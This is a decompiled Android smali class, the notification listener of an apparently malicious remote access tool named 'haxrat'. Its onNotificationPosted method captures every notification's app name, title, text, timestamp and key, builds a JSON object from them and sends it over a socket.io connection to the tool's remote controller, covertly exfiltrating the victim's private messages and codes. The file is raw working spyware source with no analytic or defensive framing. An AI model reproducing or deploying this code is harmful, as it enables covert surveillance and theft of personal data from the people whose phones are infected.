.class public Lcom/hax4us/haxrat/NotificationListener;
.super Landroid/service/notification/NotificationListenerService;
.source "NotificationListener.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 43
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/service/notification/NotificationListenerService;-><init>()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 5
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 19
    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    move-object v4, v1

    invoke-super {v3, v4}, Landroid/service/notification/NotificationListenerService;->onBind(Landroid/content/Intent;)Landroid/os/IBinder;

    move-result-object v3

    move-object v0, v3

    return-object v0
.end method

.method public onNotificationPosted(Landroid/service/notification/StatusBarNotification;)V
    .locals 19
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/service/notification/StatusBarNotification;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 25
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object v12, v1

    :try_start_0
    invoke-virtual {v12}, Landroid/service/notification/StatusBarNotification;->getPackageName()Ljava/lang/String;

    move-result-object v12

    move-object v3, v12

    .line 26
    move-object v12, v1

    invoke-virtual {v12}, Landroid/service/notification/StatusBarNotification;->getNotification()Landroid/app/Notification;

    move-result-object v12

    iget-object v12, v12, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    const-string v13, "android.title"

    invoke-virtual {v12, v13}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    move-object v4, v12

    .line 27
    move-object v12, v1

    invoke-virtual {v12}, Landroid/service/notification/StatusBarNotification;->getNotification()Landroid/app/Notification;

    move-result-object v12

    iget-object v12, v12, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    const-string v13, "android.text"

    invoke-virtual {v12, v13}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    move-result-object v12

    move-object v5, v12

    .line 28
    const-string v12, ""

    move-object v6, v12

    .line 29
    move-object v12, v5

    if-eqz v12, :cond_0

    move-object v12, v5

    invoke-interface {v12}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v12

    move-object v6, v12

    .line 30
    :cond_0
    move-object v12, v1

    invoke-virtual {v12}, Landroid/service/notification/StatusBarNotification;->getPostTime()J

    move-result-wide v12

    move-wide v7, v12

    .line 31
    move-object v12, v1

    invoke-virtual {v12}, Landroid/service/notification/StatusBarNotification;->getKey()Ljava/lang/String;

    move-result-object v12

    move-object v9, v12

    .line 33
    new-instance v12, Lorg/json/JSONObject;

    move-object/from16 v18, v12

    move-object/from16 v12, v18

    move-object/from16 v13, v18

    invoke-direct {v13}, Lorg/json/JSONObject;-><init>()V

    move-object v10, v12

    .line 34
    move-object v12, v10

    const-string v13, "appName"

    move-object v14, v3

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 35
    move-object v12, v10

    const-string v13, "title"

    move-object v14, v4

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 36
    move-object v12, v10

    const-string v13, "content"

    new-instance v14, Ljava/lang/StringBuffer;

    move-object/from16 v18, v14

    move-object/from16 v14, v18

    move-object/from16 v15, v18

    invoke-direct {v15}, Ljava/lang/StringBuffer;-><init>()V

    const-string v15, ""

    invoke-virtual {v14, v15}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v14

    move-object v15, v6

    invoke-virtual {v14, v15}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 37
    move-object v12, v10

    const-string v13, "postTime"

    move-wide v14, v7

    invoke-virtual {v12, v13, v14, v15}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    move-result-object v12

    .line 38
    move-object v12, v10

    const-string v13, "key"

    move-object v14, v9

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 39
    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;

    move-result-object v12

    invoke-virtual {v12}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v12

    const-string v13, "0xNO"

    const/4 v14, 0x1

    new-array v14, v14, [Ljava/lang/Object;

    move-object/from16 v18, v14

    move-object/from16 v14, v18

    move-object/from16 v15, v18

    const/16 v16, 0x0

    move-object/from16 v17, v10

    aput-object v17, v15, v16

    invoke-virtual {v12, v13, v14}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v12

    .line 41
    :goto_0
    return-void

    .line 39
    :catch_0
    move-exception v12

    move-object v3, v12

    .line 41
    move-object v12, v3

    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method
